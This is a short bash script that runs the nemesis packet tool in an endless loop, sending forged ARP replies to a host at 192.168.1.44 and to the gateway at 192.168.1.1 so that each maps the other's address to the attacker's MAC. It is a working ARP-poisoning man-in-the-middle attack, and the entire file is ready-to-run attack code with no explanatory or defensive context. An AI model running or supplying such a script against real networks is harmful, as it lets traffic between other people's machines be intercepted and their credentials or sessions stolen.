#!/bin/bash

while true; do
    sudo ./nemesis arp -v -r -d enp1s0 -S 192.168.1.1 -D 192.168.1.44 -h 18:c0:4d:15:7a:0b -m 00:0c:29:f7:46:90 -H 18:c0:4d:15:7a:0b -M 00:0c:29:f7:46:90
    sudo ./nemesis arp -v -r -d enp1s0 -S 192.168.1.44 -D 192.168.1.1 -h 18:c0:4d:15:7a:0b -m e8:d1:1b:66:f6:55 -H 18:c0:4d:15:7a:0b -M e8:d1:1b:66:f6:55
    echo "Redirecting..."
    sleep 10
 done
